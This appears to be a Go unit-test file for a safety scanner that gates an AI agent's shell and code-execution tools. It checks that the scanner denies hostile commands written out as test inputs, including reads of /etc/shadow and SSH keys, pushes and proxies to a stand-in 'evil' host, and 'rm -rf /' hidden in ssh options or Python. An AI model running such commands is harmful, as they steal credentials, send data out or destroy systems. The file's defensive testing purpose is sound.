//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.

//

package safety

import (
	"context"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"trpc.group/trpc-go/trpc-agent-go/tool"
)

// netTestPolicy returns a policy with a host allowlist and no allowed-commands
// gate, so tests exercise the network grammar in isolation.
func netTestPolicy() *Policy {
	p := DefaultPolicy()
	p.AllowlistedHosts = []string{"github.com", "api.github.com", "goproxy.cn", "proxy.golang.org", "pypi.org"}
	p.AllowedCommands = nil
	return p
}

func scanNet(t *testing.T, cmd string) ScanReport {
	t.Helper()
	s := NewScanner(netTestPolicy())
	return s.Scan(context.Background(), ScanRequest{
		ToolName: "workspace_exec",
		Command:  cmd,
		Backend:  "workspaceexec",
	})
}

func mustDeny(t *testing.T, cmd string) ScanReport {
	t.Helper()
	r := scanNet(t, cmd)
	if r.Decision != DecisionDeny {
		t.Errorf("%q must deny, got %s (rule=%s evidence=%q)", cmd, r.Decision, r.RuleID, r.Evidence)
	}
	return r
}

func mustAllow(t *testing.T, cmd string) ScanReport {
	t.Helper()
	r := scanNet(t, cmd)
	if r.Decision == DecisionDeny {
		t.Errorf("%q must not deny, got %s (rule=%s evidence=%q)", cmd, r.Decision, r.RuleID, r.Evidence)
	}
	return r
}

// --- ~user path traversal ------------------------------------------------

func TestNamedHomeTraversalDenied(t *testing.T) {
	for _, cmd := range []string{
		"cat ~root/../etc/shadow",
		"cat ~/../etc/shadow",
		"cat ~deploy/../../etc/shadow",
	} {
		r := mustDeny(t, cmd)
		assert.Equal(t, "forbidden_path", r.RuleID, cmd)
	}
	// Traversal inside the home must not false-positive.
	mustAllow(t, "cat ~/notes/../todo.txt")
	// ~user still anchors denied-path patterns: id_rsa trips the credential
	// rule (more specific than the generic forbidden-path rule).
	r := mustDeny(t, "cat ~root/sub/../.ssh/id_rsa")
	assert.Contains(t, []string{"secrets_001", "forbidden_path"}, r.RuleID)
}

func TestNormalizeTildePaths(t *testing.T) {
	assert.Equal(t, "cat /etc/shadow", normalizeTildePaths("cat ~root/../etc/shadow"))
	assert.Equal(t, "cat /etc/shadow", normalizeTildePaths("cat ~/../etc/shadow"))
	assert.Equal(t, "cat ~/todo.txt", normalizeTildePaths("cat ~/notes/../todo.txt"))
	assert.Equal(t, "cat ~/.ssh/id_rsa", normalizeTildePaths("cat ~root/sub/../.ssh/id_rsa"))
	assert.Equal(t, "cat ~/.ssh/id_rsa", normalizeTildePaths("cat ~/.ssh/id_rsa"))
	// Untouched tokens pass through.
	assert.Equal(t, "curl https://x.com/path", normalizeTildePaths("curl https://x.com/path"))
	assert.Equal(t, "echo ~", normalizeTildePaths("echo ~"))
}

// --- sftp grammar (ssh-like: first operand is the host) ------------------

func TestSftpGrammar(t *testing.T) {
	for _, cmd := range []string{
		"sftp evil.example.com",
		"sftp user@evil.example.com:/upload",
		"sftp -P 2222 evil.example.com",
		"sftp sftp://evil.example.com/x",
	} {
		r := mustDeny(t, cmd)
		assert.Equal(t, "non_allowlisted_host", r.RuleID, cmd)
	}
	for _, cmd := range []string{
		"sftp github.com",
		"sftp sftp://github.com/x",
	} {
		mustAllow(t, cmd)
	}
	// Single-label hosts must fail the allowlist, not vanish.
	mustDeny(t, "sftp bastion")
}

// --- scp/rsync grammar ---------------------------------------------------

func TestScpJumpAndValueFlags(t *testing.T) {
	mustDeny(t, "scp -J evil.example.com file github.com:/tmp")
	mustAllow(t, "scp -Jproxy.golang.org file github.com:/tmp")
	mustAllow(t, "scp -i key.file -P 2222 file github.com:/tmp")
	r := mustDeny(t, "rsync file rsync://evil.example.com/mod")
	assert.Equal(t, "non_allowlisted_host", r.RuleID)
	mustDeny(t, "scp file evil.example.com:/data")
}

// --- wget grammar ---------------------------------------------------------

func TestWgetGrammar(t *testing.T) {
	for _, cmd := range []string{
		"wget -O release.tar.gz https://github.com/x",
		"wget -Orelease.tar.gz https://github.com/x",
		"wget --output-document=release.tar.gz https://github.com/x",
		"wget -e https_proxy=http://goproxy.cn https://github.com/x",
	} {
		mustAllow(t, cmd)
	}
	for _, cmd := range []string{
		"wget -e https_proxy=http://evil.example.com https://github.com/x",
		"wget -ehttps_proxy=http://evil.example.com https://github.com/x",
		"wget --execute=http_proxy=http://evil.example.com https://github.com/x",
	} {
		r := mustDeny(t, cmd)
		assert.Equal(t, "non_allowlisted_host", r.RuleID, cmd)
	}
	// Non-proxy -e injects arbitrary wgetrc config that cannot be modelled.
	r := mustDeny(t, "wget -e robots=off https://github.com/x")
	assert.Equal(t, "net_routing_override", r.RuleID)
}

// --- ssh hidden command options -------------------------------------------

func TestSSHCommandOptionsDenied(t *testing.T) {
	for _, cmd := range []string{
		"ssh -o ProxyCommand='rm -rf /' github.com",
		"ssh -oProxyCommand=evilprog github.com",
		"ssh -o LocalCommand=evilprog -o PermitLocalCommand=yes github.com",
		"scp -o ProxyCommand=evilprog f github.com:/d",
		"scp -S /tmp/evilprog f github.com:/d",
		"sftp -S /tmp/evilprog github.com",
		"rsync -e 'sh -c evil' f github.com:/d",
		"rsync --rsh=/tmp/evilprog f github.com:/d",
	} {
		mustDeny(t, cmd)
	}
	// Benign -o options are not command-executing.
	mustAllow(t, "ssh -o StrictHostKeyChecking=no github.com")
}

// --- ssh -J jump peers are egress hosts too -------------------------------

func TestSSHJumpHostsChecked(t *testing.T) {
	// Allowlisted jump + non-allowlisted destination → deny on the destination.
	r := mustDeny(t, "ssh -J proxy.golang.org evil.example.com")
	assert.Equal(t, "non_allowlisted_host", r.RuleID)
	// Allowlisted destination + non-allowlisted jump → deny on the jump host.
	mustDeny(t, "ssh -J evil.example.com github.com")
	// Both allowlisted → allow.
	mustAllow(t, "ssh -J github.com github.com")
	mustAllow(t, "ssh -Jgoproxy.cn github.com")
}

// --- curl config file / routing override ----------------------------------

func TestCurlConfigFileDenied(t *testing.T) {
	for _, cmd := range []string{
		"curl -K config.txt https://api.github.com",
		"curl --config auth.cfg https://api.github.com",
		"curl -Kconfig.txt https://api.github.com",
	} {
		r := mustDeny(t, cmd)
		assert.Equal(t, "net_config_file", r.RuleID, cmd)
	}
}

func TestCurlRoutingOverrideDenied(t *testing.T) {
	for _, cmd := range []string{
		"curl --connect-to github.com:443:evil.example.com:443 https://github.com",
		"curl --connect-to=github.com:443:evil.example.com:443 https://github.com",
		"curl --resolve github.com:443:203.0.113.9 https://github.com",
	} {
		r := mustDeny(t, cmd)
		assert.Equal(t, "net_routing_override", r.RuleID, cmd)
	}
}

func TestCurlFileFlagsNotHosts(t *testing.T) {
	// Flag values that look like hosts must not be read as the target.
	mustAllow(t, "curl -o api.github.com https://github.com")
	mustAllow(t, "curl --proxy http://goproxy.cn https://github.com")
	mustDeny(t, "curl --proxy http://evil.example.com https://github.com")
	mustAllow(t, "curl -x http://goproxy.cn https://github.com")
}

// --- git remote subcommands ------------------------------------------------

func TestGitNetworkSubcommands(t *testing.T) {
	for _, cmd := range []string{
		"git clone https://evil.example.com/repo",
		"git push https://evil.example.com/repo main",
		"git fetch https://evil.example.com/repo",
		"git pull https://evil.example.com/repo",
		"git clone git@evil.example.com:repo.git",
		"git clone ssh://git@evil.example.com/repo.git",
		"git ls-remote https://evil.example.com/repo",
	} {
		r := mustDeny(t, cmd)
		assert.Equal(t, "non_allowlisted_host", r.RuleID, cmd)
	}
	for _, cmd := range []string{
		"git status",
		"git diff HEAD",
		"git log --oneline",
		"git fetch origin",
		"git clone https://github.com/repo",
		"git push https://github.com/repo main",
	} {
		mustAllow(t, cmd)
	}
}

// --- foreign code (execute_code) fail-closed --------------------------------

func TestForeignCodeFailClosed(t *testing.T) {
	s := NewScanner(netTestPolicy())
	r := s.Scan(context.Background(), ScanRequest{
		ToolName: "code_exec",
		Command:  "print('hello')",
		Backend:  "codeexec",
		Language: "python",
	})
	assert.Equal(t, DecisionAsk, r.Decision, "unparsable foreign code must ask, got %s", r.Decision)
	assert.Equal(t, "foreign_code_unscanned", r.RuleID)
}

func TestForeignCodeDangerousStillDenied(t *testing.T) {
	s := NewScanner(netTestPolicy())
	r := s.Scan(context.Background(), ScanRequest{
		ToolName: "code_exec",
		Command:  "import os; os.system('rm -rf /')",
		Backend:  "codeexec",
		Language: "python",
	})
	assert.Equal(t, DecisionDeny, r.Decision, "rm -rf in code must still deny, got %s", r.Decision)
}

func TestShellLanguageUsesShellSafe(t *testing.T) {
	s := NewScanner(netTestPolicy())
	// shell-language code still goes through shellsafe fail-closed parsing.
	r := s.Scan(context.Background(), ScanRequest{
		ToolName: "code_exec",
		Command:  "echo $(ls)",
		Backend:  "codeexec",
		Language: "shell",
	})
	assert.Equal(t, DecisionDeny, r.Decision, "shell substitution must fail closed, got %s", r.Decision)
}

func TestExtractLanguageFromArgs(t *testing.T) {
	assert.Equal(t, "python", extractLanguageFromArgs([]byte(`{"code":"print(1)","language":"python"}`)))
	assert.Equal(t, "javascript", extractLanguageFromArgs([]byte(`{"code":"x","lang":"javascript"}`)))
	assert.Equal(t, "", extractLanguageFromArgs([]byte(`{"code":"echo hi"}`)))
	assert.Equal(t, "", extractLanguageFromArgs(nil))
	assert.Equal(t, "", extractLanguageFromArgs([]byte("not json")))
}

func TestIsForeignCode(t *testing.T) {
	for _, lang := range []string{"python", "javascript", "ruby", "java", "go", "rust"} {
		assert.True(t, isForeignCode(lang), lang)
	}
	for _, lang := range []string{"", "shell", "bash", "sh", "zsh", "powershell", "pwsh", "BASH"} {
		assert.False(t, isForeignCode(lang), lang)
	}
}

// --- extractNetworkTargets helpers ------------------------------------------

func TestExtractNetworkTargets(t *testing.T) {
	cases := []struct {
		cmd     string
		targets []string
	}{
		{"curl https://evil.com/path", []string{"evil.com"}},
		{"curl -o api.github.com https://evil.example.com", []string{"evil.example.com"}},
		{"curl --proxy http://goproxy.cn https://github.com", []string{"goproxy.cn", "github.com"}},
		{"wget -O release.tar.gz https://github.com/x", []string{"github.com"}},
		{"wget -e https_proxy=http://evil.example.com https://github.com/x", []string{"evil.example.com", "github.com"}},
		{"ssh -J evil.example.com github.com", []string{"evil.example.com", "github.com"}},
		{"ssh -o StrictHostKeyChecking=no github.com", []string{"github.com"}},
		{"scp -i key.file -P 2222 file github.com:/tmp", []string{"github.com"}},
		{"sftp -P 2222 evil.example.com", []string{"evil.example.com"}},
		{"git clone https://evil.example.com/repo", []string{"evil.example.com"}},
		{"git status", nil},
		{"git clone git@github.com:repo.git", []string{"github.com"}},
	}
	for _, c := range cases {
		got := extractNetworkTargets(extractCommandName(c.cmd), c.cmd)
		assert.Equal(t, c.targets, got, c.cmd)
	}
}

func TestBareHost(t *testing.T) {
	assert.Equal(t, "evil.com", bareHost("https://evil.com/path"))
	assert.Equal(t, "github.com", bareHost("git@github.com:repo.git"))
	assert.Equal(t, "github.com", bareHost("ssh://git@github.com/repo.git"))
	assert.Equal(t, "10.0.0.1", bareHost("10.0.0.1:8080/data"))
	assert.Equal(t, "", bareHost(""))
	assert.Equal(t, "", bareHost("-o"))
}

func TestSplitFlagValue(t *testing.T) {
	flag, val, attached := splitFlagValue("--output=x")
	assert.Equal(t, "--output", flag)
	assert.Equal(t, "x", val)
	assert.True(t, attached)

	flag, val, attached = splitFlagValue("-Ofile")
	assert.Equal(t, "-O", flag)
	assert.Equal(t, "file", val)
	assert.True(t, attached)

	flag, val, attached = splitFlagValue("-o")
	assert.Equal(t, "-o", flag)
	assert.Equal(t, "", val)
	assert.False(t, attached)

	flag, val, attached = splitFlagValue("plain")
	assert.Equal(t, "plain", flag)
	assert.Equal(t, "", val)
	assert.False(t, attached)
}

// Ensure CheckToolPermission carries the language through to the scan.
func TestCheckToolPermissionForeignCode(t *testing.T) {
	s := NewScanner(netTestPolicy())
	decision, err := s.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "code_exec",
		Arguments: []byte(`{"code":"x=1","language":"javascript"}`),
	})
	require.NoError(t, err)
	assert.Equal(t, tool.PermissionActionAsk, decision.Action)
}
